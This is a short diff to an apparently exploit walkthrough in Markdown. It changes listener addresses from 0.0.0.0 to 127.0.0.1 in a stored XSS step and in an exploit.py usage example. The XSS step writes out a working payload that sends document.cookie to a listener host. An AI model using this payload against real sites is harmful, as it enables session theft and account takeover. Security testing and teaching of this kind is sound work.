@@ -500,7 +500,7 @@ Repeat steps 1 and 2 from testing.
 
 #### Step 3
 
-Construct payload as `<script>new Image().src='http://0.0.0.0:9001/log?cookie='+document.cookie</script>"`, and update the profile's description
+Construct payload as `<script>new Image().src='http://127.0.0.1:9001/log?cookie='+document.cookie</script>"`, and update the profile's description
 
 #### Step 4
 
@@ -538,5 +538,5 @@ python exploit.py -user1-pass USER_PASS -my-ip IP -p PORT
 For example:
 
 ```sh
-python exploit.py -u user1 -l 0.0.0.0 -p 9001
+python exploit.py -u user1 127.0.0.1 9001
 ```
